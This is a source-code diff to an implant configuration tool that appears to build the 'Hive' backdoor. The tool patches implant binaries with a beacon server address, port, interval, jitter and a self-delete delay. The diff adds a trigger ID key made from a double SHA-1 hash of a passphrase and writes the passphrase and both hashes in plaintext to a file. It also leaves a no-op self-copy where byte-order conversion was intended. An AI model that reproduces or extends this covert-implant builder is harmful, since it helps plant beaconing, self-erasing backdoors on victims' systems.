@@ -10,7 +10,6 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <time.h>
-
 #include "_unpatched_solaris_sparc.h"
 #include "_unpatched_solaris_i386.h"
 #include "_unpatched_linux_i386.h"
@@ -22,6 +21,10 @@
 #include "debug.h"
 #include "string_utils.h"
 #include "colors.h"
+
+//PolarSSL Files
+#include "./ssl/polarssl/include/polarssl/config.h"
+#include "./ssl/polarssl/include/polarssl/sha1.h"
 
 #define HIVE_SOLARIS_SPARC_FILE "hived-solaris-sparc-PATCHED"
 #define HIVE_SOLARIS_I386_FILE "hived-solaris-i386-PATCHED"
@@ -50,6 +53,7 @@ struct cl_args
 	unsigned int	host_len;
 	char            beacon_ip[256];
 	char            iface[16];
+	unsigned char   idKey[20];
 	unsigned long   init_delay;
 	unsigned int    interval;
 	unsigned int	trigger_delay;
@@ -60,7 +64,7 @@ struct cl_args
 
 #define SIG_HEAD    0x7AD8CFB6
 
-struct cl_args     args = { SIG_HEAD, 0,  0, {0}, {0}, 0, 0, 0, 0, 0, 0 };
+struct cl_args     args = { SIG_HEAD, 0,  0, {0}, {0}, {0}, 0, 0, 0, 0, 0, 0 };
 
 #define DEFAULT_INITIAL_DELAY		3 * 60 * 1000		// 3 minutes
 #define DEFAULT_BEACON_PORT		443			// TCP port 443 (HTTPS)
@@ -68,6 +72,26 @@ struct cl_args     args = { SIG_HEAD, 0,  0, {0}, {0}, 0, 0, 0, 0, 0, 0 };
 #define DEFAULT_TRIGGER_DELAY		60 * 1000		// 60 seconds
 #define DEFAULT_BEACON_JITTER		3                       // Default value is 3, range is from 0<=jitter<=30
 #define DEFAULT_SELF_DELETE_DELAY	60 * 24 * 60 * 60 	// Default value is 60 days...
+
+//declare displaySha1Hash function
+void displaySha1Hash(char *label, unsigned char *sha1Hash);
+//define displaySha1Hash function
+void displaySha1Hash(char *label, unsigned char *sha1Hash)
+{
+	int i=0;
+
+	//Display Label
+	D( printf( " DEBUG: %s=[", label ); );
+
+	//Display 40 hexadecimal number array
+	for (i=0; i<20; i++)
+	{
+	   D( printf("%02x",sha1Hash[i]); );
+	}
+	D( printf( "]\n" ); );
+
+}
+
 
 //********************************************************************************
 int user_instructions( void );
@@ -80,10 +104,11 @@ int usage( char **argv )
 {
 	printf( "\n" );
    fprintf(stdout, "  %sUsage:%s\n", BLUE, RESET );
-   fprintf(stdout, "  %s [-a address] [-d b_delay] [-i interval] [-I interface] [-p port] [-t t_delay] [-m OS] \n\n", *argv );
+   fprintf(stdout, "  %s [-a address] [-d b_delay] [-i interval] [-k idKey] [-I interface] [-p port] [-t t_delay] [-m OS] \n\n", *argv );
    fprintf(stdout, "    %s[-a address]%s   - IP address or hostname of beacon server\n", GREEN, RESET );
    fprintf(stdout, "    %s[-d b_delay]%s   - initial delay before first beacon (in seconds), 0 for no beacons.\n", GREEN, RESET );
    fprintf(stdout, "    %s[-i interval]%s  - beacon interval (in seconds)\n", GREEN, RESET );
+   fprintf(stdout, "    %s[-k idKeyPhrase]%s  - idKey Phrase (maximum 100 Character Sequence with no spaces)\n", GREEN, RESET );
    fprintf(stdout, "    %s[-j b_jitter]%s   - beacon jitter (integer of percent variance between 0 and 30 [0-30] )\n", GREEN,RESET);
    fprintf(stdout, "    %s[-I interface]%s - Solaris Only - interface to listen for triggers\n", GREEN, RESET );
    fprintf(stdout, "    %s[-p port]%s      - (optional) beacon port [default: 443]\n", GREEN, RESET );
@@ -140,6 +165,10 @@ int main( int argc, char **argv )
 	int				mikrotik_ppc = 0;	// MikroTik PowerPC [Big Endian]
 	int				raw = 0; 		// unpatched versions
 	char				*host = (char *)NULL;	// cached hostname for user confirmation message
+	FILE				*implantIDFile;         //Used to save implant keys and subsequent sha1 hashes...
+	unsigned char                   tempSha1Hash[20];       //Used to determine sha1 Hash key
+	unsigned char                   idKey[20];              //Sha1 Hash of keyphrase's sha1 hash
+	int 				hashIndex;
 
 	args.patched = 1;
 	args.init_delay = DEFAULT_INITIAL_DELAY;
@@ -150,7 +179,7 @@ int main( int argc, char **argv )
 	args.jitter = DEFAULT_BEACON_JITTER;
 	args.host_len = 0;
 
-    while ( ( optval = getopt(argc, argv, "+m:a:p:i:I:d:t:s:j:h")) != -1 )
+    while ( ( optval = getopt(argc, argv, "+m:a:p:i:I:k:d:t:s:j:h")) != -1 )
     {
         switch( optval )
         {
@@ -265,6 +294,51 @@ int main( int argc, char **argv )
 
 				break;
 
+	
+			// ID Key Phrase used for sha1 hash that is stored in idKey 
+			case 'k':
+				if ( strlen( optarg ) < 8 ) 
+				{
+					printf( " ERROR: Insufficient length for keyPhrase entered, must be greater than 7 characters limit\n" ); 
+					return -1;
+				}
+
+				sha1( (const unsigned char*) optarg, strlen(optarg), tempSha1Hash);    //Compute sha1 hash of keyPhrase and save as tempSha1Hash
+										//  This is what the trigger packet will send...
+
+				sha1( (const unsigned char*) tempSha1Hash, 20*sizeof(unsigned char), idKey);                 //idKey contains the final sha1 hash
+										// which is the implant's id key.  This will be 
+										// compared with the sha1 of the trigger packets sent
+										// sha1 hash [tempSha1Hash]
+				displaySha1Hash("tempSha1Hash", tempSha1Hash);
+				displaySha1Hash("idKey", idKey);
+				memcpy( args.idKey, idKey, 20*sizeof(unsigned char));
+	
+				// Save the implant's id key.
+				implantIDFile=fopen("idKeys.txt", "a+");        //Used to save implant keys and subsequent sha1 hashes...
+				if ( implantIDFile != NULL)
+				{
+					fprintf( implantIDFile, "%s \t ", optarg );
+					for (hashIndex=0; hashIndex<20; hashIndex++)
+					{
+						fprintf(implantIDFile, "%02x", tempSha1Hash[hashIndex]);
+					}
+					fprintf( implantIDFile, " \t " );
+					for (hashIndex=0; hashIndex<20; hashIndex++)
+					{
+						fprintf(implantIDFile, "%02x", idKey[hashIndex]);
+					}
+					fprintf( implantIDFile, " \n " );
+				}
+				else
+				{
+					printf( "Unable to save implantID information into the idKeys.txt file.\n" );
+					return -1;
+				}
+				fclose(implantIDFile);
+				
+				break;
+
 			// beacon interval
 			case 'i':
 				args.interval = (unsigned int)atoi( optarg ) * 1000;
@@ -339,6 +413,14 @@ int main( int argc, char **argv )
 		printf( "  This application will generate PATCHED files with the following values:\n" );
 		printf( "   . Beacon Server IP address    -> %s\n", host );
 		printf( "   . Beacon Server Port number   -> %d\n", args.beacon_port );
+
+		printf( "   . Implant ID Key              -> ");
+		for (hashIndex=0; hashIndex<20; hashIndex++)
+		{
+			printf("%02x", args.idKey[hashIndex]);
+		}
+		printf( "\n" );
+
 		printf( "   . Beacon Initial Delay        -> %lu (sec)\n", args.init_delay/1000 );
 		printf( "   . Beacon Interval             -> %d (sec)\n", args.interval/1000 );
 		printf( "   . Beacon Jitter               -> %d (percentage)\n", args.jitter );              //Added jitter display
@@ -558,6 +640,11 @@ int patch( char *filename, unsigned char *hexarray, unsigned int arraylen, struc
 		copy_of_args.sig = htonl( copy_of_args.sig );
 		copy_of_args.beacon_port = htonl( copy_of_args.beacon_port );
 		copy_of_args.host_len = htonl( copy_of_args.host_len );
+
+		//How do I convert array of sha1 hash into network byte order for different endian type of machines...
+		memcpy( copy_of_args.idKey, copy_of_args.idKey, 20*sizeof(unsigned char));
+		//copy_of_args.idKey = htonl( &copy_of_args.idKey );
+
 		copy_of_args.init_delay = htonl( copy_of_args.init_delay );
 		copy_of_args.interval = htonl( copy_of_args.interval );
 		copy_of_args.jitter = htonl( copy_of_args.jitter );
